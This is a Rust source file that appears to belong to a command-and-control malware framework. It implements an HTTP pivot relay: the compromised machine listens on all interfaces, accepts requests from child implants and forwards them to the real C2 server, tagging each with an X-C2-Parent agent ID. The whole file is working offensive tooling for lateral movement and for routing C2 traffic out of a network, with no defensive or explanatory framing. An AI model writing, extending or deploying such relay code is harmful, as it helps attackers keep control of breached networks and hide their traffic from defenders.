#![allow(dead_code)]
/// HTTP pivot relay server.
/// Child agents point their ServerUrl here; each request is forwarded to the real C2
/// with an X-C2-Parent header set to this agent's ID.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};

static HTTP_PIVOT_STOP: AtomicBool = AtomicBool::new(true);
static HTTP_PIVOT_AGENT_ID: OnceLock<Mutex<String>> = OnceLock::new();

fn pivot_agent_id() -> std::sync::MutexGuard<'static, String> {
    HTTP_PIVOT_AGENT_ID.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

pub fn set_http_pivot_agent_id(id: &str) {
    *pivot_agent_id() = id.to_string();
}

fn handle_http_relay(mut client: TcpStream) {
    const BUFSZ: usize = 65536;
    let mut buf = vec![0u8; BUFSZ];
    let mut total = 0usize;
    let mut hdr_end = None::<usize>;
    let mut content_len = 0usize;
    loop {
        let n = match client.read(&mut buf[total..]) {
            Ok(0) | Err(_) => return,
            Ok(n) => n,
        };
        total += n;
        if hdr_end.is_none() {
            let window = &buf[..total];
            if let Some(i) = window.windows(4).position(|w| w == b"\r\n\r\n") {
                hdr_end = Some(i);
                let hdr_str = String::from_utf8_lossy(&window[..i]).to_lowercase();
                for line in hdr_str.lines() {
                    if let Some(val) = line.strip_prefix("content-length:") {
                        content_len = val.trim().parse().unwrap_or(0);
                    }
                }
            }
        }
        if let Some(he) = hdr_end {
            if total >= he + 4 + content_len { break; }
        }
        if total >= BUFSZ { break; }
    }
    let raw = &buf[..total];
    let hdr_end_pos = match raw.windows(4).position(|w| w == b"\r\n\r\n") {
        Some(i) => i,
        None => { let _ = client.write_all(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"); return; }
    };
    let hdrs = &raw[..hdr_end_pos];
    let first_line_end = hdrs.iter().position(|&b| b == b'\r').unwrap_or(hdrs.len());
    let first_line = String::from_utf8_lossy(&hdrs[..first_line_end]);
    let mut parts = first_line.split_whitespace();
    let method = parts.next().unwrap_or("GET").to_string();
    let path   = parts.next().unwrap_or("/").to_string();
    let hdr_str_lc = String::from_utf8_lossy(hdrs).to_lowercase();
    let ct = hdr_str_lc.lines()
        .find(|l| l.starts_with("content-type:"))
        .map(|l| &l["content-type:".len()..])
        .unwrap_or("")
        .trim()
        .to_string();
    let body = &raw[hdr_end_pos + 4..];
    let agent_id = pivot_agent_id().clone();
    let extra_hdr = if ct.is_empty() {
        format!("X-C2-Parent: {}\r\n", agent_id)
    } else {
        format!("Content-Type: {}\r\nX-C2-Parent: {}\r\n", ct, agent_id)
    };
    let resp = crate::transport::http_do_with_header(&method, &path, body, &extra_hdr);
    match resp {
        Some((status, data)) => {
            let status_line = format!("HTTP/1.1 {} OK\r\n", status);
            let hdr_out = format!("{}Content-Length: {}\r\n\r\n", status_line, data.len());
            let _ = client.write_all(hdr_out.as_bytes());
            if !data.is_empty() { let _ = client.write_all(&data); }
        }
        None => {
            let _ = client.write_all(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n");
        }
    }
}

pub fn start_http_pivot(port: u16) -> String {
    if !HTTP_PIVOT_STOP.swap(false, Ordering::Relaxed) {
        return "[-] HTTP pivot already running".to_string();
    }
    let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)) {
        Ok(l) => l,
        Err(e) => {
            HTTP_PIVOT_STOP.store(true, Ordering::Relaxed);
            return format!("[-] HTTP pivot: bind failed: {}", e);
        }
    };
    std::thread::spawn(move || {
        listener.set_nonblocking(false).ok();
        for stream in listener.incoming() {
            if HTTP_PIVOT_STOP.load(Ordering::Relaxed) { break; }
            match stream {
                Ok(s) => { std::thread::spawn(|| handle_http_relay(s)); }
                Err(_) => break,
            }
        }
        HTTP_PIVOT_STOP.store(true, Ordering::Relaxed);
    });
    format!("[+] HTTP pivot started on port {} → {}", port, crate::config::SERVER_URL)
}

pub fn stop_http_pivot() -> &'static str {
    if HTTP_PIVOT_STOP.load(Ordering::Relaxed) { return "[-] HTTP pivot not running"; }
    HTTP_PIVOT_STOP.store(true, Ordering::Relaxed);
    "[+] HTTP pivot stopped"
}
